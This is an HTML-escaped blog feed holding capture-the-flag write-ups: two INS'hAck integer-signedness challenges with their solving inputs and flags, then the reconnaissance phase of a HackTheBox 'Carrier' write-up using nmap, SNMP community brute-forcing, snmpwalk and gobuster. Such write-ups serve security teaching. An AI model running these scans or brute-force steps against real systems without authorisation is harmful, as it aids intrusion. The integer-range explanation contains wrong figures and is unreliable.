  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gimmeFlagPliz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No, I can't give you the flag: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that our input is stored in an unsigned 64-bit int (v5). As indicated by the file &lt;strong&gt;limits.h&lt;/strong&gt;, this type of variable can hold values between 0 and 4,294,967,295.
Then, a signed 64-bit int is incremented until reaching the value we submitted. 64-bit signed integers can hold value between −2,147,483,648 and +2,147,483,647.&lt;/p&gt;

&lt;p&gt;The for loop forces us to submit a positive integer, at least when this one is unsigned.&lt;/p&gt;

&lt;p&gt;Let me explain. The following byte: &lt;em&gt;1111 1111&lt;/em&gt; will be seen as &lt;strong&gt;255 in the unsigned world&lt;/strong&gt; and as &lt;strong&gt;-1 in the signed world&lt;/strong&gt;.
So if we submit 2147483647, the program should return -1 because 2147483647 (unsigned) == 1111111111111111111111111111111 (binary) == -1 (signed).&lt;/p&gt;

&lt;p&gt;Let’s verify this:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./intergover
Give me one param: 2147483647
No, I can&lt;span class=&quot;s1&quot;&gt;'t give you the flag: -1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great! The pseudo-code taught us that &lt;strong&gt;v4&lt;/strong&gt; had to be equal to &lt;strong&gt;-14&lt;/strong&gt; in order to call &lt;strong&gt;gimmeFlagPliz()&lt;/strong&gt;, so all we have to do is to submit (2147483647-13) == &lt;strong&gt;2147483634&lt;/strong&gt; and to grab the flag!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ssh_inshack &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2223 user@intergover.ctf.insecurity-insa.fr
Warning: Permanently added the ECDSA host key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;IP address &lt;span class=&quot;s1&quot;&gt;'[XX.XX.XX.XXX]:2223'&lt;/span&gt; to the list of known hosts.
 ___           _   _            _      ____   ___  _  ___
|_ _|_ __  ___| | | | __ _  ___| | __ |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
| &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_ \/ __| |_| |/ _` |/ __| |/ /   __) | | | | | (_) |
| || | | \__ \  _  | (_| | (__|   &amp;lt;   / __/| |_| | |\__, |
|___|_| |_|___/_| |_|\__,_|\___|_|\_\ |_____|\___/|_|  /_/

===========================================================

      You are accessing a sandbox challenge over SSH
        This sandbox will be killed soon enough.
       Please wait while we launch your sandbox...

===========================================================

Give me one param: 2147483634
INSA{B3_v3rY_c4r3fUL_w1tH_uR_1nt3g3r_bR0}
Connection to intergover.ctf.insecurity-insa.fr closed.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;pwn-signed-or-unsigned&quot;&gt;[Pwn] Signed or unsigned&lt;/h2&gt;

&lt;h3 id=&quot;statement-5&quot;&gt;Statement&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Signed or not signed, this is the question :)
&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/signed_or_not_signed&quot; title=&quot;signed or not signed&quot;&gt;Binary&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i &amp;lt;your_keyfile&amp;gt; -p 2228 user@signed-or-not-signed.ctf.insecurity-insa.fr&lt;/code&gt;
To find your keyfile, look into your profile on this website.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=inXC_lab-34&quot;&gt;https://www.youtube.com/watch?v=inXC_lab-34&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;spotting-the-vulnerability&quot;&gt;Spotting the vulnerability&lt;/h3&gt;

&lt;p&gt;As this challenge is in the same vein as the previous one, I’ll go straight to the solution.&lt;/p&gt;

&lt;p&gt;We have a 64-bit ELF which can be translated in the following pseudo-code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/code48.png&quot; alt=&quot;Pseudo code&quot; title=&quot;code signed or not signed&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If the user input is inferior to 10, we call the &lt;strong&gt;vuln()&lt;/strong&gt; function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/vuln.png&quot; alt=&quot;Vuln&quot; title=&quot;Vuln&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The user input is stored in a signed integer so we can submit &lt;strong&gt;-666&lt;/strong&gt; directly and get the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ssh_inshack &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2228 user@signed-or-not-signed.ctf.insecurity-insa.fr

 ___           _   _            _      ____   ___  _  ___
|_ _|_ __  ___| | | | __ _  ___| | __ |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
| &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'_ \/ __| |_| |/ _` |/ __| |/ /   __) | | | | | (_) |
| || | | \__ \  _  | (_| | (__|   &amp;lt;   / __/| |_| | |\__, |
|___|_| |_|___/_| |_|\__,_|\___|_|\_\ |_____|\___/|_|  /_/

===========================================================

      You are accessing a sandbox challenge over SSH
        This sandbox will be killed soon enough.
       Please wait while we launch your sandbox...

===========================================================
Please give me a number:-666
INSA{Th3_qU3sTi0n_1s_S1gN3d_0r_x90}
Connection to signed-or-not-signed.ctf.insecurity-insa.fr closed.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Not too much difficulty in this one but well it’s still a flag :)&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html"></summary></entry><entry><title type="html">HackTheBox: Carrier writeup</title><link href="http://localhost:4000/HackTheBox-Carrier.html" rel="alternate" type="text/html" title="HackTheBox: Carrier writeup" /><published>2019-03-16T22:00:00+01:00</published><updated>2019-03-16T22:00:00+01:00</updated><id>http://localhost:4000/HackTheBox-Carrier</id><content type="html" xml:base="http://localhost:4000/HackTheBox-Carrier.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/carrier-box.png&quot; alt=&quot;Carrier box&quot; title=&quot;Carrier Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Carrier was a very interesting box where a &lt;strong&gt;web command injection&lt;/strong&gt; gave access to a &lt;strong&gt;BGP router&lt;/strong&gt;. After some &lt;strong&gt;BGP Hijacking&lt;/strong&gt; magic, it was possible to retrieve the FTP credentials of a rich Nigerian Prince, which allowed us to read the flag stored on this FTP server…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#initial-foothold-and-user-access&quot; id=&quot;markdown-toc-initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#very-snmp&quot; id=&quot;markdown-toc-very-snmp&quot;&gt;Very SNMP&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#lyghtspeed-web-server&quot; id=&quot;markdown-toc-lyghtspeed-web-server&quot;&gt;Lyghtspeed web server&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#from-command-injection-to-reverse-shell&quot; id=&quot;markdown-toc-from-command-injection-to-reverse-shell&quot;&gt;From Command Injection to Reverse Shell&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#tickets&quot; id=&quot;markdown-toc-tickets&quot;&gt;Tickets&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#diagnostics&quot; id=&quot;markdown-toc-diagnostics&quot;&gt;Diagnostics&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#road-to-reverse-shell&quot; id=&quot;markdown-toc-road-to-reverse-shell&quot;&gt;Road to Reverse Shell&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#network-configuration&quot; id=&quot;markdown-toc-network-configuration&quot;&gt;Network configuration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#network-interfaces&quot; id=&quot;markdown-toc-network-interfaces&quot;&gt;Network interfaces&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#bgp-configuration&quot; id=&quot;markdown-toc-bgp-configuration&quot;&gt;BGP configuration&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#routing-table&quot; id=&quot;markdown-toc-routing-table&quot;&gt;Routing table&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#updated-network-diagram&quot; id=&quot;markdown-toc-updated-network-diagram&quot;&gt;Updated network diagram&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#whats-the-plan&quot; id=&quot;markdown-toc-whats-the-plan&quot;&gt;What’s the plan?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#1012015024-scanning&quot; id=&quot;markdown-toc-1012015024-scanning&quot;&gt;10.120.15.0/24 scanning&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#10120151&quot; id=&quot;markdown-toc-10120151&quot;&gt;10.120.15.1&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#101201510&quot; id=&quot;markdown-toc-101201510&quot;&gt;10.120.15.10&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bgp-hijacking&quot; id=&quot;markdown-toc-bgp-hijacking&quot;&gt;BGP Hijacking&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#fake-route-advertising&quot; id=&quot;markdown-toc-fake-route-advertising&quot;&gt;Fake route Advertising&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#changing-eth2-ip-address&quot; id=&quot;markdown-toc-changing-eth2-ip-address&quot;&gt;Changing eth2 ip address&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#faking-an-ftp-server&quot; id=&quot;markdown-toc-faking-an-ftp-server&quot;&gt;Faking an FTP server&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#retrieving-the-flag&quot; id=&quot;markdown-toc-retrieving-the-flag&quot;&gt;Retrieving the flag&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#final-words&quot; id=&quot;markdown-toc-final-words&quot;&gt;Final words&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;initial-foothold-and-user-access&quot;&gt;Initial Foothold And User Access&lt;/h2&gt;

&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;

&lt;p&gt;The initial &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan revealed an Apache web server on port 80 and an SSH server on port 22.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; 10.10.10.105
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
PORT   STATE    SERVICE REASON      VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI2Jfx6VeMU2wFDys5YoSIVCu4U626/VDawUrXKa5SR+D8HaNvt6QFECtQumoFcYzxD7Jnd3PKw/dXTXvePTPnolDUNV3oim
X8gEI3iY157v5scgrOKFjw39cTMuTfLc7/rM8e2TOeziN4yzzLfWAiTbe4wfiDe8cea7zJ1RFwvgGc398xiOA8bo1nwMD0wUkduJhtH4V98LpJZOVB4tMmtCdyb1T+e3HIR/1Wbm
MBLs0e6Cc/rf+K8vgqu6Tu/o4o8/TZ9aH9K5xoDRUXjU2R1w/Bi0HvYYHFRf664/NG9WcK/R0VlV6j92DOYL9wdUYwANyQPc4YCDfyuM6F6Bbd
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJToeoLQWJwkfcWBimMzO4E6BKOaHbTkWIk1uHoniOdaUaDL5C6MO2NeYYSaru
/ikAYSHPU83p1p6hNcOJVy+OY&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
|   256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIN0vm7BcvmBgddJb7k1W7qUkBgn2n0T1bdOU6GV1JB8
80/tcp open     http    syn-ack     Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Login
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A UDP scan turned out to be also very interesting (&lt;code class=&quot;highlighter-rouge&quot;&gt;--max-retries 0&lt;/code&gt; drastically reduces the scanning time).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--max-retries&lt;/span&gt; 0 10.10.10.105
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-16 19:38 CET
Warning: 10.10.10.105 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.105
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.040s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 991 open|filtered ports
PORT      STATE  SERVICE
161/udp   open   snmp
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;very-snmp&quot;&gt;Very SNMP&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Nmap Scripting Engine&lt;/strong&gt; provides a script named &lt;em&gt;snmp-brute&lt;/em&gt;, which is useful for bruteforcing snmp communities.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; snmp-brute &lt;span class=&quot;nt&quot;&gt;-p161&lt;/span&gt; 10.10.10.105
Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-16 19:42 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.105
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.041s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|_  public - Valid credentials

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2.15 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; is a script automating the exploration of a MIB for a given community. Thanks to this tool, we could retrieve a string that will be essential in the rest of the box.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snmpwalk &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.105 &lt;span class=&quot;nt&quot;&gt;-v1&lt;/span&gt;
iso.3.6.1.2.1.47.1.1.1.1.11 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;SN#NET_45JDX23&quot;&lt;/span&gt;
End of MIB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s move on to the web server!&lt;/p&gt;

&lt;h3 id=&quot;lyghtspeed-web-server&quot;&gt;Lyghtspeed web server&lt;/h3&gt;

&lt;p&gt;The web server showed a login page when browsing to &lt;a href=&quot;http://10.10.10.105:80&quot;&gt;http://10.10.10.105:80&lt;/a&gt; as well as &lt;strong&gt;error codes 45007 and 45009&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-login.png&quot; alt=&quot;Lyghtspeed login&quot; title=&quot;Lyghtspeed login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Trivial username/password combinations were not successful so I focused on the enumeration using &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.105 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 50 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php

&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.0              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://10.10.10.105/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 50
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : php
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
2019/03/16 20:14:41 Starting gobuster
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/img &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/tools &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/doc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/css &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/tickets.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/fonts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/dashboard.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/debug &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/diag.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
2019/03/16 20:17:32 Finished
&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Most of the potentially interesting pages redirected to the login page. However, a pdf file named &lt;em&gt;“error_codes.pdf”&lt;/em&gt; was available under &lt;strong&gt;/doc&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-doc.png&quot; alt=&quot;Lyghtspeed /doc&quot; title=&quot;Lyghtspeed /doc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;error_codes.pdf&lt;/strong&gt; gives a description for every error code of the Lyghtspeed Management Platform. Let’s study the meaning of codes &lt;strong&gt;45007&lt;/strong&gt; and &lt;strong&gt;45009&lt;/strong&gt; that we’ve seen ealier on the login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-codes.png&quot; alt=&quot;Lyghtspeed codes&quot; title=&quot;Lyghtspeed codes&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The string we found in the MIB is actually &lt;strong&gt;the serial number of the chassis&lt;/strong&gt; (SN#NET_45JDX23).&lt;/p&gt;

